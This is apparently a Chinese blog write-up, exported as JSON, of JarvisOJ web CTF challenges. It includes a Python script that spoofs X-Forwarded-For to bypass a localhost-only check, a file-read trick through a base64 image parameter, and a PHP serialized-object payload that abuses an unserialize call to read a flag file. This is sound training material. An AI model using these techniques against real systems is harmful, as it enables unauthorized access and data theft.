{"title":"JarvisOJ WP","slug":"JarvisOJ","date":"2019-07-23T09:32:23.740Z","updated":"2019-07-23T09:53:52.059Z","comments":true,"path":"api/articles/JarvisOJ.json","photos":[],"link":"","excerpt":"真是被自己菜哭了，暑假第一个月一定要把WEB刷完写完WP！","covers":null,"content":"<p>真是被自己菜哭了，暑假第一个月一定要把WEB刷完写完WP！</p>\n<a id=\"more\"></a>\n\n<h2 id=\"WEB\"><a href=\"#WEB\" class=\"headerlink\" title=\"WEB\"></a>WEB</h2><p>有时间也做做别的</p>\n<h3 id=\"0x01-PORT51\"><a href=\"#0x01-PORT51\" class=\"headerlink\" title=\"0x01 PORT51\"></a>0x01 PORT51</h3><p>题目链接：<a href=\"http://web.jarvisoj.com:32770/\" title=\"题目链接\" target=\"_blank\" rel=\"noopener\">http://web.jarvisoj.com:32770/</a></p>\n<h3 id=\"0x02-Localhost\"><a href=\"#0x02-Localhost\" class=\"headerlink\" title=\"0x02 Localhost\"></a>0x02 Localhost</h3><p>题目链接 <a href=\"http://web.jarvisoj.com:32774/\" target=\"_blank\" rel=\"noopener\">http://web.jarvisoj.com:32774/</a></p>\n<p>题目要求localhost only,我们可以通过伪造X-FORWARDED-FOR来达到目的</p>\n<pre><code>import requests\n\nurl=&apos;http://web.jarvisoj.com:32774/&apos;\n\ns=requests.session()\ndata={\n&apos;X-FORWARDED-FOR&apos;:&apos;127.0.0.1&apos;\n}\nr=s.get(url,headers=data)\nprint(r.text)</code></pre><p>返回信息包含flag</p>\n<h4 id=\"tips\"><a href=\"#tips\" class=\"headerlink\" title=\"tips\"></a>tips</h4><p>这里再稍稍补充一下HTTP协议请求头的知识</p>\n<ol>\n<li>每个HTTP请求的第一行都由3个以空格间隔的项目组成</li>\n<li>一个说明HTTP方法的动词，主要作用是从Web服务器获取一个资源，GET请求并没有消息主题，因此消息头后的空白行中没有其他数据。</li>\n<li>第二个是请求的URL，通常由一个所请求的资源名称以及客户端向该资源提交的参数的可选查询字符串组成</li>\n<li>第三个是使用的HTTP版本，常用HTTP版本为1.1和1.0，我们遇到的唯一差异可能就是1.1版本必须使用Host请求</li>\n<li>Referer消息头表示用于发出请求的原始URL</li>\n<li>User-Agent消息头提供与浏览器或其他生成请求的客户端软件有关的信息</li>\n<li>Host消息头用于指定出现在被访问的完整URL中的主机名称，如果几个WEB站点以相同的一台服务器为主机就需要指定HOST，因为第一行中的URL通常不包含主机名称。服务器可以通过该字段进行IP过滤操作。</li>\n<li>X-FORWARDED-FOR当你使用了代理时web服务器就不知道你的真实IP了，为了避免这种情况代理服务器会增加一个该字段信息，把链接他的客户端IP加到这个消息头里，保证服务器能获取到真实IP。这是一个扩展头。</li>\n<li>cookie为服务器端生成的存于客户端的身份标识</li>\n</ol>\n<h3 id=\"0x03-Login\"><a href=\"#0x03-Login\" class=\"headerlink\" title=\"0x03 Login\"></a>0x03 Login</h3><p>题目链接：<a href=\"http://web.jarvisoj.com:32772/\" target=\"_blank\" rel=\"noopener\">http://web.jarvisoj.com:32772/</a></p>\n<h3 id=\"0x04-神盾局的秘密\"><a href=\"#0x04-神盾局的秘密\" class=\"headerlink\" title=\"0x04 神盾局的秘密\"></a>0x04 神盾局的秘密</h3><p>题目链接：<a href=\"http://web.jarvisoj.com:32768/\" target=\"_blank\" rel=\"noopener\">http://web.jarvisoj.com:32768/</a></p>\n<p>进入题目后查看源码发现ba64加密的字符串</p>\n<p><code>http://web.jarvisoj.com:32768/showimg.php?img=c2hpZWxkLmpwZw==</code></p>\n<p>尝试编码index.php读源码</p>\n<pre><code>&lt;?php \n    require_once(&apos;shield.php&apos;);\n    $x = new Shield();\n    isset($_GET[&apos;class&apos;]) &amp;&amp; $g = $_GET[&apos;class&apos;];\n    if (!empty($g)) {\n        $x = unserialize($g);\n    }\n    echo $x-&gt;readfile();\n?&gt;</code></pre><p>可以看到包含了shield.php，再读shield.php</p>\n<pre><code>&lt;?php\n    //flag is in pctf.php\n    class Shield {\n        public $file;\n        function __construct($filename = &apos;&apos;) {\n            $this -&gt; file = $filename;\n        }\n\n        function readfile() {\n            if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&apos;..&apos;)===FALSE  \n            &amp;&amp; stripos($this-&gt;file,&apos;/&apos;)===FALSE &amp;&amp; stripos($this-&gt;file,&apos;\\\\&apos;)==FALSE) {\n                return @file_get_contents($this-&gt;file);\n            }\n        }\n    }\n?&gt;</code></pre><p>简单的序列化，控制file变量</p>\n<pre><code>&lt;?php\n    //flag is in pctf.php\nclass Shield {\n    public $file;\n    function __construct($filename = &apos;&apos;) {\n        $this -&gt; file = $filename;\n    }\n\n    function readfile() {\n        if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&apos;..&apos;)===FALSE  \n        &amp;&amp; stripos($this-&gt;file,&apos;/&apos;)===FALSE &amp;&amp; stripos($this-&gt;file,&apos;\\\\&apos;)==FALSE) {\n            return @file_get_contents($this-&gt;file);\n        }\n    }\n}\n$example = new Shield();\n$example-&gt;file = &quot;pctf.php&quot;;\necho serialize($example);\n?&gt;</code></pre>","categories":[],"tags":[]}